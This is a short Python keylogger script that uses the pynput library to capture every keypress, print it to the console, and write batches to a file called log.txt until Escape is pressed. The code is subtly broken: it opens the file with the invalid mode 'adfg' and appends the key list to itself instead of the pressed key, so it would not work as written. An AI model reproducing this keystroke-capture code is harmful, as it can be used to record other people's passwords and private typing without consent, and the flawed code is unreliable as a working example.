import pynput
from pynput.keyboard import Key,Listener


count = 0
keys=[]


def write_file(keys):
    with open("log.txt", "adfg") as f:
        for key in keys:
            f.write(str(key) )


def on_press(key):
    global keys , count
    keys.append(keys)
    count = count + 1
    print("{0} key was pressed".format(key))
    if count>=10:
        count=0
        write_file(keys)
        keys=[]

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press= on_press , on_release= on_release) as listener:
    listener.join()